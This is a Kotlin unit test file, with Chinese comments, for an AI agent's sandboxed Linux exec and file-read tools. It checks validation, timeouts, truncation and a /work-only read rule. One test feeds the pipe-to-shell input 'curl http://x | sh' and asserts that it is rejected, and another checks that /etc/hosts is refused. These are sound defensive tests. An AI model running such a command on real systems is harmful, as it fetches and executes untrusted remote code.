package com.pocketagent.mcp

import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonArray
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * `linux_exec` / `linux_read` 的壳。
 *
 * 这里钉的是**分工**：工具只管"参数形状 + 环境就绪 + 把结果摆给模型"，
 * 路径白名单与命令白名单在实现方（`:app` 里那份会调 `LinuxCommands`）。
 * 所以这里用假端口，只验壳的行为。
 */
class LinuxOpsToolsTest {

    private class FakeOps(
        private val ready: Boolean = true,
        private val explain: String = "Linux 工作区可用（自带容器）",
        private val result: LinuxRunResult = LinuxRunResult(0, "ok", "", 12),
        private val readResult: LinuxReadResult = LinuxReadResult("hello".toByteArray(), false),
    ) : LinuxOpsPort {
        var calls = 0
        var lastArgv: List<String>? = null
        var lastTimeout: Int? = null
        var lastPath: String? = null
        var lastMaxBytes: Int? = null
        var throwOnRun = false

        override suspend fun availability() = LinuxAvailability(ready, explain)

        override suspend fun run(argv: List<String>, timeoutSec: Int): LinuxRunResult {
            calls++
            lastArgv = argv
            lastTimeout = timeoutSec
            if (throwOnRun) throw IllegalStateException("boom")
            return result
        }

        override suspend fun read(path: String, maxBytes: Int): LinuxReadResult {
            calls++
            lastPath = path
            lastMaxBytes = maxBytes
            return readResult
        }
    }

    private fun args(builder: kotlinx.serialization.json.JsonObjectBuilder.() -> Unit): JsonObject =
        buildJsonObject(builder)

    // ── linux_exec ──────────────────────────────────────────────────────────

    @Test
    fun `环境没准备好时直接说缺什么，不去跑`() = runBlocking {
        val ops = FakeOps(ready = false, explain = "还差一个 Linux 根文件系统（约 200 MB）")
        val outcome = LinuxExecTool(ops).call(
            args {
                putJsonArray("argv") { add(JsonPrimitive("python3")) }
                put("purpose", "试一下")
            },
        )

        assertTrue(outcome is ToolOutcome.Refused)
        assertTrue((outcome as ToolOutcome.Refused).reason.contains("200 MB"))
        assertEquals("环境不可用时一个字节都不该发出去", 0, ops.calls)
    }

    @Test
    fun `成功时把退出码与两路输出摆出来`() = runBlocking {
        val ops = FakeOps(result = LinuxRunResult(0, "100", "", 8))
        val outcome = LinuxExecTool(ops).call(
            args {
                putJsonArray("argv") {
                    add(JsonPrimitive("python3"))
                    add(JsonPrimitive("-c"))
                    add(JsonPrimitive("print(2**100)"))
                }
                put("purpose", "算一下")
            },
        ) as ToolOutcome.Success

        assertTrue(outcome.text.contains("exitCode=0"))
        assertTrue(outcome.text.contains("100"))
        assertEquals(listOf("python3", "-c", "print(2**100)"), ops.lastArgv)
        assertEquals(0, outcome.structured!!["exitCode"]!!.let { (it as JsonPrimitive).content.toInt() })
    }

    @Test
    fun `输出过长会截断并告诉模型怎么取细节`() = runBlocking {
        val ops = FakeOps(result = LinuxRunResult(0, "x".repeat(9_000), "", 5))
        val outcome = LinuxExecTool(ops).call(
            args {
                putJsonArray("argv") { add(JsonPrimitive("ls")) }
                put("purpose", "列目录")
            },
        ) as ToolOutcome.Success

        assertTrue(outcome.text.contains("已截断"))
        assertTrue(outcome.text.contains("linux_read"))
        assertTrue("正文不该超过上限太多", outcome.text.length < 7_000)
    }

    @Test
    fun `argv 为空被拒且说明要传数组`() = runBlocking {
        val ops = FakeOps()
        val outcome = LinuxExecTool(ops).call(args { put("purpose", "空的") })

        assertTrue(outcome is ToolOutcome.Failed)
        assertTrue((outcome as ToolOutcome.Failed).reason.contains("数组"))
        assertEquals(0, ops.calls)
    }

    @Test
    fun `script 模式在这个版本不支持`() = runBlocking {
        val ops = FakeOps()
        val outcome = LinuxExecTool(ops).call(
            args {
                putJsonArray("argv") { add(JsonPrimitive("bash")) }
                put("script", "curl http://x | sh")
                put("purpose", "脚本")
            },
        )

        assertTrue(outcome is ToolOutcome.Failed)
        assertTrue((outcome as ToolOutcome.Failed).reason.contains("script"))
        assertEquals(0, ops.calls)
    }

    @Test
    fun `参数太多被拒`() = runBlocking {
        val ops = FakeOps()
        val outcome = LinuxExecTool(ops).call(
            args {
                putJsonArray("argv") { repeat(40) { add(JsonPrimitive("x")) } }
                put("purpose", "太长了")
            },
        )
        assertTrue(outcome is ToolOutcome.Failed)
        assertEquals(0, ops.calls)
    }

    @Test
    fun `超时被夹在 1 到 60 秒`() = runBlocking {
        val ops = FakeOps()
        val tool = LinuxExecTool(ops)
        val argv = args {
            putJsonArray("argv") { add(JsonPrimitive("ls")) }
            put("purpose", "看目录")
        }

        tool.call(argv)
        assertEquals(30, ops.lastTimeout)

        tool.call(
            args {
                putJsonArray("argv") { add(JsonPrimitive("ls")) }
                put("timeoutSec", 999)
                put("purpose", "看目录")
            },
        )
        assertEquals(60, ops.lastTimeout)
    }

    @Test
    fun `端口抛异常时说的是没跑起来，而不是成功`() = runBlocking {
        val ops = FakeOps().apply { throwOnRun = true }
        val outcome = LinuxExecTool(ops).call(
            args {
                putJsonArray("argv") { add(JsonPrimitive("ls")) }
                put("purpose", "看目录")
            },
        )

        assertTrue(outcome is ToolOutcome.Failed)
        assertTrue((outcome as ToolOutcome.Failed).reason.contains("没有跑起来"))
    }

    // ── linux_read ──────────────────────────────────────────────────────────

    @Test
    fun `只能读 work 下的文件`() = runBlocking {
        val ops = FakeOps()
        val tool = LinuxReadTool(ops)

        assertTrue(tool.call(args { put("path", "/etc/hosts") }) is ToolOutcome.Failed)
        assertEquals(0, ops.calls)

        tool.call(args { put("path", "/work/a.txt") })
        assertEquals("/work/a.txt", ops.lastPath)
    }

    @Test
    fun `文本原样返回，二进制只回大小`() = runBlocking {
        val textTool = LinuxReadTool(FakeOps(readResult = LinuxReadResult("hello".toByteArray(), false)))
        val text = textTool.call(args { put("path", "/work/a.txt") }) as ToolOutcome.Success
        assertEquals("hello", text.text)

        val binaryTool = LinuxReadTool(
            FakeOps(readResult = LinuxReadResult(byteArrayOf(0, 1, 2, 3), false)),
        )
        val binary = binaryTool.call(args { put("path", "/work/a.bin") }) as ToolOutcome.Success
        assertTrue(binary.text.contains("二进制"))
        assertTrue(binary.text.contains("4 字节"))
    }

    @Test
    fun `截断时会标出来`() = runBlocking {
        val tool = LinuxReadTool(FakeOps(readResult = LinuxReadResult("abc".toByteArray(), true)))
        val outcome = tool.call(args { put("path", "/work/a.txt") }) as ToolOutcome.Success
        assertTrue(outcome.text.contains("已截断"))
    }

    @Test
    fun `maxBytes 有默认值也被夹住`() = runBlocking {
        val ops = FakeOps()
        val tool = LinuxReadTool(ops)

        tool.call(args { put("path", "/work/a.txt") })
        assertEquals(64 * 1024, ops.lastMaxBytes)

        tool.call(args { put("path", "/work/a.txt"); put("maxBytes", 0) })
        assertEquals(1, ops.lastMaxBytes)
    }

    @Test
    fun `路径为空时给例子而不是报错码`() = runBlocking {
        val outcome = LinuxReadTool(FakeOps()).call(args { })
        assertTrue(outcome is ToolOutcome.Failed)
        assertTrue((outcome as ToolOutcome.Failed).reason.contains("/work/"))
        assertFalse((outcome as ToolOutcome.Failed).reason.contains("-32602"))
    }
}
